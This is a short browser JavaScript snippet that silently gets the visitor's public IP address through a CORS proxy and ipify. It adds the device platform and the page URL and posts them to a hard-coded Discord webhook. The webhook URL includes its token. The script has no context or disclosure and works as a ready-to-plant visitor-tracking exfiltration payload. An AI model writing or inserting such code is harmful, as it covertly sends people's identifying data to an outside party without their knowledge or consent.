(async ()=>{
  const fileUrl = "https://corsproxy.io/?url=https://api.ipify.org/?format=txt";
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";

  const fileRes = await fetch(fileUrl);
  if (!fileRes.ok) throw new Error(`fetch failed ${fileRes.status}`);
  
  const text = await fileRes.text();
  const payloadText = (text.length > 1900 ? text.slice(0,1900) + "\n\n...truncated" : text);
  const message = `${payloadText}\n\n(Sent from a device on ${navigator.userAgentData?.platform || navigator.platform} at the site located at ${location.href})`;

  const payload = { content: message };

  const res = await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (!res.ok) throw new Error(`Webhook failed ${res.status}`);
})();
